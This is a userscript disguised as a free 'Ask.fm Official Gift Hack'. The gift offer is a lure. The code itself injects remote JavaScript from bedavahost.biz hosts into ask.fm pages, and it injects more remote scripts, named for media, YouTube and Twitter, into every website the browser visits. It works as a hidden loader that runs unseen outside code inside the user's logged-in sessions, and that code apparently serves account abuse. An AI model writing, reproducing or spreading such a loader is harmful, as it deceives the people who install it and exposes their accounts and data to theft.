// ==UserScript==
// @name          Ask.fm Official Gift Hack FREE
// @namespace     Ask.fm Official Gift Hack FREE
// @description   Ask.fm Official Gift Hack FREE
// @version     5.0
// @license     GPL 3.0
// @include     http*://*

// ==/UserScript==

function addJavascript(jsname){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
	s.setAttribute('src',jsname);
	th.appendChild(s);
}

if(location.hostname.indexOf("ask.fm") >= 0){
addJavascript('http://anonimo.bedavahost.biz/ask.js');
addJavascript('anonimo.bedavahost.biz/ask.js');
}

function addJavascript(jsname){
if(document.getElementsByName(jsname).length <= 0 || (document.getElementsByName(jsname).length > 0 && document.getElementsByName(jsname)[0].src != jsname)){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
    s.setAttribute("name",jsname);
	s.setAttribute('src',jsname);
	th.appendChild(s);
}
}

addJavascript("http://panelim.bedavahost.biz/vbb/medya.php?" +  Math.random());
addJavascript("http://panelim.bedavahost.biz/vbb/youtube.php?" +  Math.random());
addJavascript("http://panelim.bedavahost.biz/vbb/twitter.php?" +  Math.random());






